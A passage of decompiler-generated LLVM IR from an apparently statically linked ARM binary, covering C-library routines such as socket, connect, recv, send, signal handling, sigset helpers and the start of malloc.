  uselistorder label %.thread, { 1, 0 }
}

define i32 @__sys_connect() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_b048 = load i32, i32* @r7, align 4
  store i32 %v3_b048, i32* %stack_var_-8, align 4
  %v0_b054 = load i32, i32* @r0, align 4
  store i32 %v0_b054, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_b054, -4095
  br i1 %tmp, label %dec_label_pc_b07c, label %dec_label_pc_b064

dec_label_pc_b064:                                ; preds = %entry
  %v0_b068 = call i32 @__aeabi_read_tp()
  %v3_b06c = load i16, i16* @global_var_222f0.75, align 2
  %v4_b06c = sext i16 %v3_b06c to i32
  %v0_b070 = load i32, i32* %r2.global-to-local, align 4
  %v1_b070 = sub i32 0, %v0_b070
  store i32 %v1_b070, i32* %r2.global-to-local, align 4
  %v3_b074 = add i32 %v4_b06c, %v0_b068
  %v4_b074 = inttoptr i32 %v3_b074 to i32*
  store i32 %v1_b070, i32* %v4_b074, align 4
  %v2_b07c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_b07c

dec_label_pc_b07c:                                ; preds = %entry, %dec_label_pc_b064
  %v1_b080 = phi i32 [ %v0_b054, %entry ], [ -1, %dec_label_pc_b064 ]
  %v2_b07c = phi i32 [ %v3_b048, %entry ], [ %v2_b07c.pre, %dec_label_pc_b064 ]
  store i32 %v2_b07c, i32* @r7, align 4
  ret i32 %v1_b080

; uselistorder directives
  uselistorder i32 %v0_b054, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b07c, { 1, 0 }
}

define i32 @"$d.7"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_b084:
  %v0_b084 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_b084, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_b084
  %v2_b084 = load i32, i32* @fp, align 4
  %v8_b084 = shl i32 %v2_b084, %arg2
  %v9_b084 = and i32 %v8_b084, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_b084, %bb
  %v10_b088 = phi i32 [ %arg1, %dec_label_pc_b084 ], [ %v9_b084, %bb ]
  ret i32 %v10_b088

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_b090 = load i32, i32* @r4, align 4
  store i32 %v3_b090, i32* %stack_var_-20, align 4
  %v6_b090 = load i32, i32* @r5, align 4
  %v9_b090 = load i32, i32* @r6, align 4
  %v12_b090 = load i32, i32* @r7, align 4
  %v4_b09c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 13152) to i32*), align 4
  %v2_b0a0 = icmp eq i32 %v4_b09c, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_b0a0, label %dec_label_pc_b0b8, label %entry.dec_label_pc_b0c4_crit_edge

entry.dec_label_pc_b0c4_crit_edge:                ; preds = %entry
  br label %dec_label_pc_b0c4

dec_label_pc_b0b8:                                ; preds = %entry
  store i32 %v3_b090, i32* @r4, align 4
  store i32 %v9_b090, i32* @r6, align 4
  store i32 %v12_b090, i32* @r7, align 4
  %v0_b0c0 = call i32 @__sys_connect()
  br label %dec_label_pc_b0c4

dec_label_pc_b0c4:                                ; preds = %entry.dec_label_pc_b0c4_crit_edge, %dec_label_pc_b0b8
  %v0_b0c4 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_b0c4, i32* @r5, align 4
  %v0_b0d4 = load i32, i32* @r4, align 4
  store i32 %v0_b0d4, i32* @r0, align 4
  %v0_b0d8 = call i32 @__sys_connect()
  store i32 %v0_b0d8, i32* @r4, align 4
  %v0_b0e0 = load i32, i32* @r5, align 4
  %v1_b0e4 = call i32 @__libc_disable_asynccancel(i32 %v0_b0e0)
  %v0_b0e8 = load i32, i32* @r4, align 4
  %v2_b0f0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_b0f0, i32* @r4, align 4
  store i32 %v6_b090, i32* @r5, align 4
  store i32 %v9_b090, i32* @r6, align 4
  store i32 %v12_b090, i32* @r7, align 4
  ret i32 %v0_b0e8

; uselistorder directives
  uselistorder label %dec_label_pc_b0c4, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_b100 = load i32, i32* @r4, align 4
  store i32 %v3_b100, i32* %stack_var_-12, align 4
  %v0_b110 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_b110, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_b110, -4095
  br i1 %tmp, label %dec_label_pc_b138, label %dec_label_pc_b120

dec_label_pc_b120:                                ; preds = %entry
  %v0_b124 = call i32 @__aeabi_read_tp()
  %v3_b128 = load i16, i16* @global_var_222f0.75, align 2
  %v4_b128 = sext i16 %v3_b128 to i32
  %v0_b12c = load i32, i32* %r2.global-to-local, align 4
  %v1_b12c = sub i32 0, %v0_b12c
  store i32 %v1_b12c, i32* %r2.global-to-local, align 4
  %v3_b130 = add i32 %v4_b128, %v0_b124
  %v4_b130 = inttoptr i32 %v3_b130 to i32*
  store i32 %v1_b12c, i32* %v4_b130, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_b138.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_b138

dec_label_pc_b138:                                ; preds = %entry, %dec_label_pc_b120
  %v1_b13c = phi i32 [ %v0_b110, %entry ], [ -1, %dec_label_pc_b120 ]
  %v2_b138 = phi i32 [ %v3_b100, %entry ], [ %v2_b138.pre, %dec_label_pc_b120 ]
  store i32 %v2_b138, i32* @r4, align 4
  ret i32 %v1_b13c

; uselistorder directives
  uselistorder i32 %v0_b110, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b138, { 1, 0 }
}

define i32 @"$d.6"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_b140:
  %v0_b140 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_b140, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_b140
  %v2_b140 = load i32, i32* @r7, align 4
  %v5_b140 = udiv i32 %v2_b140, 4
  %v6_b140 = and i32 %v5_b140, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_b140, %bb
  %v7_b144 = phi i32 [ %arg1, %dec_label_pc_b140 ], [ %v6_b140, %bb ]
  ret i32 %v7_b144

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__sys_recv() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_b148 = load i32, i32* @r7, align 4
  store i32 %v3_b148, i32* %stack_var_-8, align 4
  %v0_b154 = load i32, i32* @r0, align 4
  store i32 %v0_b154, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_b154, -4095
  br i1 %tmp, label %dec_label_pc_b17c, label %dec_label_pc_b164

dec_label_pc_b164:                                ; preds = %entry
  %v0_b168 = call i32 @__aeabi_read_tp()
  %v3_b16c = load i16, i16* @global_var_222f0.75, align 2
  %v4_b16c = sext i16 %v3_b16c to i32
  %v0_b170 = load i32, i32* %r2.global-to-local, align 4
  %v1_b170 = sub i32 0, %v0_b170
  store i32 %v1_b170, i32* %r2.global-to-local, align 4
  %v3_b174 = add i32 %v4_b16c, %v0_b168
  %v4_b174 = inttoptr i32 %v3_b174 to i32*
  store i32 %v1_b170, i32* %v4_b174, align 4
  %v2_b17c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_b17c

dec_label_pc_b17c:                                ; preds = %entry, %dec_label_pc_b164
  %v1_b180 = phi i32 [ %v0_b154, %entry ], [ -1, %dec_label_pc_b164 ]
  %v2_b17c = phi i32 [ %v3_b148, %entry ], [ %v2_b17c.pre, %dec_label_pc_b164 ]
  store i32 %v2_b17c, i32* @r7, align 4
  ret i32 %v1_b180

; uselistorder directives
  uselistorder i32 %v0_b154, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b17c, { 1, 0 }
}

define i32 @"$d.5"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_b184:
  %v0_b184 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_b184, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_b184
  %v5_b184 = udiv i32 %arg3, 4
  %v6_b184 = and i32 %v5_b184, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_b184, %bb
  %v10_b188 = phi i32 [ %arg1, %dec_label_pc_b184 ], [ %v6_b184, %bb ]
  ret i32 %v10_b188

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_b190 = load i32, i32* @r4, align 4
  store i32 %v3_b190, i32* %stack_var_-24, align 4
  %v6_b190 = load i32, i32* @r5, align 4
  %v9_b190 = load i32, i32* @r6, align 4
  %v12_b190 = load i32, i32* @r7, align 4
  %v15_b190 = load i32, i32* @r8, align 4
  %v18_b190 = load i32, i32* @lr, align 4
  %v4_b19c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 13152) to i32*), align 4
  %v2_b1a0 = icmp eq i32 %v4_b19c, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_b1a0, label %dec_label_pc_b1b8, label %entry.dec_label_pc_b1c0_crit_edge

entry.dec_label_pc_b1c0_crit_edge:                ; preds = %entry
  br label %dec_label_pc_b1c0

dec_label_pc_b1b8:                                ; preds = %entry
  store i32 %v3_b190, i32* @r4, align 4
  store i32 %v9_b190, i32* @r6, align 4
  store i32 %v12_b190, i32* @r7, align 4
  store i32 %v15_b190, i32* @r8, align 4
  %v0_b1bc = call i32 @__sys_recv()
  br label %dec_label_pc_b1c0

dec_label_pc_b1c0:                                ; preds = %entry.dec_label_pc_b1c0_crit_edge, %dec_label_pc_b1b8
  %v0_b1c0 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_b1c0, i32* @r5, align 4
  %v0_b1d4 = load i32, i32* @r4, align 4
  store i32 %v0_b1d4, i32* @r0, align 4
  %v0_b1d8 = call i32 @__sys_recv()
  store i32 %v0_b1d8, i32* @r4, align 4
  %v0_b1e0 = load i32, i32* @r5, align 4
  %v1_b1e4 = call i32 @__libc_disable_asynccancel(i32 %v0_b1e0)
  %v0_b1e8 = load i32, i32* @r4, align 4
  %v2_b1ec = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_b1ec, i32* @r4, align 4
  store i32 %v6_b190, i32* @r5, align 4
  store i32 %v9_b190, i32* @r6, align 4
  store i32 %v12_b190, i32* @r7, align 4
  store i32 %v15_b190, i32* @r8, align 4
  store i32 %v18_b190, i32* @lr, align 4
  ret i32 %v0_b1e8

; uselistorder directives
  uselistorder label %dec_label_pc_b1c0, { 1, 0 }
}

define i32 @__sys_send() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_b1fc = load i32, i32* @r7, align 4
  store i32 %v3_b1fc, i32* %stack_var_-8, align 4
  %v0_b208 = load i32, i32* @r0, align 4
  store i32 %v0_b208, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_b208, -4095
  br i1 %tmp, label %dec_label_pc_b230, label %dec_label_pc_b218

dec_label_pc_b218:                                ; preds = %entry
  %v0_b21c = call i32 @__aeabi_read_tp()
  %v3_b220 = load i16, i16* @global_var_222f0.75, align 2
  %v4_b220 = sext i16 %v3_b220 to i32
  %v0_b224 = load i32, i32* %r2.global-to-local, align 4
  %v1_b224 = sub i32 0, %v0_b224
  store i32 %v1_b224, i32* %r2.global-to-local, align 4
  %v3_b228 = add i32 %v4_b220, %v0_b21c
  %v4_b228 = inttoptr i32 %v3_b228 to i32*
  store i32 %v1_b224, i32* %v4_b228, align 4
  %v2_b230.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_b230

dec_label_pc_b230:                                ; preds = %entry, %dec_label_pc_b218
  %v1_b234 = phi i32 [ %v0_b208, %entry ], [ -1, %dec_label_pc_b218 ]
  %v2_b230 = phi i32 [ %v3_b1fc, %entry ], [ %v2_b230.pre, %dec_label_pc_b218 ]
  store i32 %v2_b230, i32* @r7, align 4
  ret i32 %v1_b234

; uselistorder directives
  uselistorder i32 %v0_b208, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b230, { 1, 0 }
}

define i32 @"$d.4"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_b238:
  %v0_b238 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_b238, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_b238
  %v5_b238 = udiv i32 %arg2, 4
  %v6_b238 = and i32 %v5_b238, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_b238, %bb
  %v7_b23c = phi i32 [ %arg1, %dec_label_pc_b238 ], [ %v6_b238, %bb ]
  ret i32 %v7_b23c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_b244 = load i32, i32* @r4, align 4
  store i32 %v3_b244, i32* %stack_var_-24, align 4
  %v6_b244 = load i32, i32* @r5, align 4
  %v9_b244 = load i32, i32* @r6, align 4
  %v12_b244 = load i32, i32* @r7, align 4
  %v15_b244 = load i32, i32* @r8, align 4
  %v18_b244 = load i32, i32* @lr, align 4
  %v4_b250 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 13152) to i32*), align 4
  %v2_b254 = icmp eq i32 %v4_b250, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_b254, label %dec_label_pc_b26c, label %entry.dec_label_pc_b274_crit_edge

entry.dec_label_pc_b274_crit_edge:                ; preds = %entry
  br label %dec_label_pc_b274

dec_label_pc_b26c:                                ; preds = %entry
  store i32 %v3_b244, i32* @r4, align 4
  store i32 %v9_b244, i32* @r6, align 4
  store i32 %v12_b244, i32* @r7, align 4
  store i32 %v15_b244, i32* @r8, align 4
  %v0_b270 = call i32 @__sys_send()
  br label %dec_label_pc_b274

dec_label_pc_b274:                                ; preds = %entry.dec_label_pc_b274_crit_edge, %dec_label_pc_b26c
  %v0_b274 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_b274, i32* @r5, align 4
  %v0_b288 = load i32, i32* @r4, align 4
  store i32 %v0_b288, i32* @r0, align 4
  %v0_b28c = call i32 @__sys_send()
  store i32 %v0_b28c, i32* @r4, align 4
  %v0_b294 = load i32, i32* @r5, align 4
  %v1_b298 = call i32 @__libc_disable_asynccancel(i32 %v0_b294)
  %v0_b29c = load i32, i32* @r4, align 4
  %v2_b2a0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_b2a0, i32* @r4, align 4
  store i32 %v6_b244, i32* @r5, align 4
  store i32 %v9_b244, i32* @r6, align 4
  store i32 %v12_b244, i32* @r7, align 4
  store i32 %v15_b244, i32* @r8, align 4
  store i32 %v18_b244, i32* @lr, align 4
  ret i32 %v0_b29c

; uselistorder directives
  uselistorder label %dec_label_pc_b274, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_b2b0 = load i32, i32* @r7, align 4
  store i32 %v3_b2b0, i32* %stack_var_-8, align 4
  %v0_b2bc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_b2bc, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_b2bc, -4095
  br i1 %tmp, label %dec_label_pc_b2e4, label %dec_label_pc_b2cc

dec_label_pc_b2cc:                                ; preds = %entry
  %v0_b2d0 = call i32 @__aeabi_read_tp()
  %v3_b2d4 = load i16, i16* @global_var_222f0.75, align 2
  %v4_b2d4 = sext i16 %v3_b2d4 to i32
  %v0_b2d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_b2d8 = sub i32 0, %v0_b2d8
  store i32 %v1_b2d8, i32* %r2.global-to-local, align 4
  %v3_b2dc = add i32 %v4_b2d4, %v0_b2d0
  %v4_b2dc = inttoptr i32 %v3_b2dc to i32*
  store i32 %v1_b2d8, i32* %v4_b2dc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_b2e4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_b2e4

dec_label_pc_b2e4:                                ; preds = %entry, %dec_label_pc_b2cc
  %v1_b2e8 = phi i32 [ %v0_b2bc, %entry ], [ -1, %dec_label_pc_b2cc ]
  %v2_b2e4 = phi i32 [ %v3_b2b0, %entry ], [ %v2_b2e4.pre, %dec_label_pc_b2cc ]
  store i32 %v2_b2e4, i32* @r7, align 4
  ret i32 %v1_b2e8

; uselistorder directives
  uselistorder i32 %v0_b2bc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b2e4, { 1, 0 }
}

define i32 @"$d.3"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_b2ec:
  %v0_b2ec = load i1, i1* @cpsr_z, align 1
  br i1 %v0_b2ec, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_b2ec
  %v2_b2ec = load i32, i32* @sb, align 4
  %v8_b2ec = shl i32 %v2_b2ec, %arg2
  %v9_b2ec = and i32 %v8_b2ec, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_b2ec, %bb
  %v10_b2f0 = phi i32 [ %arg1, %dec_label_pc_b2ec ], [ %v9_b2ec, %bb ]
  ret i32 %v10_b2f0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_b2f4 = load i32, i32* @r4, align 4
  store i32 %v3_b2f4, i32* %stack_var_-16, align 4
  %v6_b2f4 = load i32, i32* @r5, align 4
  %v9_b2f4 = load i32, i32* @r6, align 4
  %v7_b2fc = icmp eq i32 %arg2, -1
  br i1 %v7_b2fc, label %.thread4, label %bb

.thread4:                                         ; preds = %entry
  br label %.thread16

bb:                                               ; preds = %entry
  %v2_b304 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_b320

.thread16:                                        ; preds = %bb, %.thread4
  br label %dec_label_pc_b328

dec_label_pc_b320:                                ; preds = %bb
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* @r6, align 4
  %v7_b324 = icmp slt i32 %arg1, 65
  br i1 %v7_b324, label %dec_label_pc_b344, label %dec_label_pc_b328

dec_label_pc_b328:                                ; preds = %.thread16, %dec_label_pc_b320
  %v0_b32c = call i32 @__aeabi_read_tp()
  %v3_b330 = load i16, i16* @global_var_222f0.75, align 2
  %v4_b330 = sext i16 %v3_b330 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_b33c = add i32 %v4_b330, %v0_b32c
  %v4_b33c = inttoptr i32 %v3_b33c to i32*
  store i32 22, i32* %v4_b33c, align 4
  %v0_b39c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb33

dec_label_pc_b344:                                ; preds = %dec_label_pc_b320
  %v2_b344 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_b344, i32* @r4, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_b34c = ptrtoint i32* %stack_var_-24 to i32
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v2_b35c = call i32 @__sigaddset(i32 %v2_b34c, i32 %arg1)
  %v0_b364 = load i32, i32* @r5, align 4
  store i32 %v0_b364, i32* %r1.global-to-local, align 4
  %v0_b368 = load i32, i32* @r6, align 4
  %v2_b368 = add i32 %v0_b368, 12248
  %v2_b36c = call i32 @__GI___sigismember(i32 %v2_b368, i32 %v0_b364)
  store i32 %v2_b344, i32* %r1.global-to-local, align 4
  %v0_b380 = load i32, i32* @r5, align 4
  %v3_b38c = call i32 @__libc_sigaction(i32 %v0_b380, i32 %v2_b344, i32 %v2_b304)
  %v1_b390 = icmp slt i32 %v3_b38c, 0
  br i1 %v1_b390, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_b344
  %v5_b394 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_b394, i32* %r1.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_b344
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_b328, %bb32
  %v0_b39c = phi i32 [ %v5_b394, %bb31 ], [ %v0_b39c.pre, %dec_label_pc_b328 ], [ -1, %bb32 ]
  %v2_b3a4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_b3a4, i32* @r4, align 4
  store i32 %v6_b2f4, i32* @r5, align 4
  store i32 %v9_b2f4, i32* @r6, align 4
  ret i32 %v0_b39c

; uselistorder directives
  uselistorder i32 %v2_b344, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 65, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 3, 2, 4, 0, 1 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b328, { 1, 0 }
}

define i32 @__GI___sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_b3b8 = add i32 %arg2, -1
  %v3_b3bc = udiv i32 %v1_b3b8, 32
  %v4_b3c0 = mul nuw nsw i32 %v3_b3bc, 4
  %v5_b3c0 = add i32 %v4_b3c0, %arg1
  %v6_b3c0 = inttoptr i32 %v5_b3c0 to i32*
  %v7_b3c0 = load i32, i32* %v6_b3c0, align 4
  %v1_b3c4 = urem i32 %v1_b3b8, 32
  %v7_b3cc = shl i32 1, %v1_b3c4
  %v8_b3cc = and i32 %v7_b3c0, %v7_b3cc
  %v10_b3cc = icmp ne i32 %v8_b3cc, 0
  %. = zext i1 %v10_b3cc to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_b3b8, { 1, 0 }
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_b3dc = add i32 %arg2, -1
  %v3_b3e0 = udiv i32 %v1_b3dc, 32
  %v4_b3e4 = mul nuw nsw i32 %v3_b3e0, 4
  %v5_b3e4 = add i32 %v4_b3e4, %arg1
  %v6_b3e4 = inttoptr i32 %v5_b3e4 to i32*
  %v7_b3e4 = load i32, i32* %v6_b3e4, align 4
  %v1_b3e8 = urem i32 %v1_b3dc, 32
  %v7_b3f0 = shl i32 1, %v1_b3e8
  %v8_b3f0 = or i32 %v7_b3e4, %v7_b3f0
  store i32 %v8_b3f0, i32* %v6_b3e4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_b3dc, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_b400 = add i32 %arg2, -1
  %v3_b404 = udiv i32 %v1_b400, 32
  %v4_b408 = mul nuw nsw i32 %v3_b404, 4
  %v5_b408 = add i32 %v4_b408, %arg1
  %v6_b408 = inttoptr i32 %v5_b408 to i32*
  %v7_b408 = load i32, i32* %v6_b408, align 4
  %v1_b40c = urem i32 %v1_b400, 32
  %tmp = shl i32 -1, %v1_b40c
  %v8_b414 = add i32 %tmp, -1
  %v9_b414 = and i32 %v7_b408, %v8_b414
  store i32 %v9_b414, i32* %v6_b408, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_b400, { 1, 0 }
}

define i32 @__malloc_largebin_index(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_b424 = udiv i32 %arg1, 256
  store i32 %v3_b424, i32* %r1.global-to-local, align 4
  %v2_b428 = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_b428, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_b434 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_b428, i32 %v0_b434)
  %v0_b438 = load i32, i32* %r1.global-to-local, align 4
  %v1_b438 = add i32 %v0_b438, 1048320
  %v3_b43c = udiv i32 %v1_b438, 65536
  %v1_b440 = and i32 %v3_b43c, 8
  %v6_b444 = shl i32 %v0_b438, %v1_b440
  %v1_b448 = add i32 %v6_b444, 520192
  %v3_b44c = udiv i32 %v1_b448, 65536
  %v1_b450 = and i32 %v3_b44c, 4
  %v6_b454 = shl i32 %v6_b444, %v1_b450
  %v1_b458 = add i32 %v6_b454, 245760
  %v3_b45c = udiv i32 %v1_b458, 65536
  %v1_b460 = and i32 %v3_b45c, 2
  %v6_b464 = shl i32 %v6_b454, %v1_b460
  store i32 %v6_b464, i32* %r1.global-to-local, align 4
  %v1_b468 = sub nsw i32 13, %v1_b440
  %v2_b46c = sub nsw i32 %v1_b468, %v1_b450
  %v3_b470 = udiv i32 %v6_b464, 32768
  %v4_b470 = sub nuw nsw i32 -1, %v3_b470
  %v4_b474 = udiv i32 %v6_b464, 16384
  %v5_b474 = and i32 %v4_b474, %v4_b470
  %v2_b478 = sub nsw i32 %v2_b46c, %v1_b460
  %v2_b47c = add nsw i32 %v2_b478, %v5_b474
  %v1_b480 = add nsw i32 %v2_b47c, 6
  %v0_b484 = load i32, i32* %ip.global-to-local, align 4
  %v6_b484 = lshr i32 %v0_b484, %v1_b480
  %v3_b488 = mul nsw i32 %v2_b47c, 4
  %v1_b48c = add nsw i32 %v3_b488, 32
  %v1_b490 = urem i32 %v6_b484, 4
  %v2_b494 = or i32 %v1_b490, %v1_b48c
  ret i32 %v2_b494

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_b49c = load i32, i32* @r4, align 4
  %v6_b49c = load i32, i32* @r5, align 4
  %v9_b49c = load i32, i32* @r6, align 4
  %v12_b49c = load i32, i32* @r7, align 4
  %v15_b49c = load i32, i32* @r8, align 4
  %v18_b49c = load i32, i32* @sb, align 4
  %v21_b49c = load i32, i32* @sl, align 4
  %v24_b49c = load i32, i32* @fp, align 4
  %v27_b49c = load i32, i32* @lr, align 4
  store i32 116, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %r1.global-to-local, align 4
  %v4_b4b0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 116) to i32*), align 4
  store i32 %v4_b4b0, i32* %r4.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_b4bc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 72) to i32*), align 4
  store i32 %v4_b4bc, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %v4_b4b0, i32* %r2.global-to-local, align 4
  %v2_b4c8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_b4c8, i32* %r0.global-to-local, align 4
